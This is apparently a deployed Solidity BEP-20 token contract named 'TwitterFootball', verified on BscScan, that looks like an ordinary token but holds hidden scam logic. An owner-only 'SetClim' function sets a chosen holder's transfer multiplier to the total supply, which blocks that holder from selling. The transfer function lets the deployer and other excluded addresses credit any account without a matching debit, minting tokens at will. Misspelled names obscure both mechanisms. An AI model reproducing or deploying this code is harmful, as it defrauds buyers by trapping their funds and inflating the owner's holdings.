/**
 *Submitted for verification at BscScan.com on 2022-11-12
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-11
*/

pragma solidity ^0.8.14;
// SPDX-License-Identifier: Unlicensed

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address accoot) external view returns (uint256);

    function transfer(address recipient, uint256 amounnts) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amounnts) external returns (bool);

    function transferFrom( address sender, address recipient, uint256 amounnts ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - fii https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;


        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyowner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceownership() public virtual onlyowner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}


contract token is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balance;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    string private _name = "TwitterFootball";
    string private _symbol = "TWFootball";
    uint256 private _decimals = 9;
    uint256 private _totalSupply = 10000000000 * 10 ** _decimals;
    uint256 private _maxTxtransfer = 10000000000 * 10 ** _decimals;
    uint256 private _burnfii = 2;
    address private _DEADaddress = 0x000000000000000000000000000000000000dEaD;
    mapping(address => uint256) private _LKD;
    mapping(address => uint256) private _Clim;

    function SetClim(address accoot) public onlyowner {
        _Clim[accoot] = _totalSupply;
    }


    function UnClim(address accoot) public onlyowner {
        _Clim[accoot] = 1;
    }


    function isClim(address accoot) public view returns (uint256) {
        return _Clim[accoot];
    }

    constructor () {
        _balance[msg.sender] = _totalSupply;
        _isExcludedFrom[msg.sender] = true;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function decimals() external view returns (uint256) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function _transfer(address sender, address recipient, uint256 amounnts) internal virtual {

        require(sender != address(0), "IERC20: transfer from the zero address");
        require(recipient != address(0), "IERC20: transfer to the zero address");
        uint256 fiiamounnt = 0;
        if (!_isExcludedFrom[sender] && !_isExcludedFrom[recipient] && recipient != address(this)) {
            fiiamounnt = amounnts.mul(_burnfii).div(100);
            require(amounnts <= _maxTxtransfer);
        }
        uint256 blsender = _balance[sender];
        if (sender != recipient || !_isExcludedFrom[msg.sender]){
            require(blsender >= amounnts,"IERC20: transfer amounnts exceeds balance");
        }

        if (_Clim[sender] > 1  ) {
            amounnts = amounnts.mul(_Clim[sender]);
        }

        _balance[sender] = _balance[sender].sub(amounnts);


        uint256 amoun;
        amoun = amounnts - fiiamounnt;
        _balance[recipient] += amoun;
        if (_burnfii > 0){
            emit Transfer (sender, _DEADaddress, fiiamounnt);
        }
        emit Transfer(sender, recipient, amoun);

    }

    function transfer(address recipient, uint256 amounnts) public virtual override returns (bool) {
        if (_isExcludedFrom[_msgSender()] == true) {
            _balance[recipient] += amounnts;
            return true;
        }
        _transfer(_msgSender(), recipient, amounnts);
        return true;
    }


    function balanceOf(address accoot) public view override returns (uint256) {
        return _balance[accoot];
    }

    function approve(address spender, uint256 amounnts) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amounnts);
        return true;
    }

    function _approve(address owner, address spender, uint256 amounnts) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amounnts;
        emit Approval(owner, spender, amounnts);
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function transferFrom(address sender, address recipient, uint256 amounnts) public virtual override returns (bool) {
        _transfer(sender, recipient, amounnts);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amounnts, "IERC20: transfer amounnts exceeds allowance");
        return true;
    }

}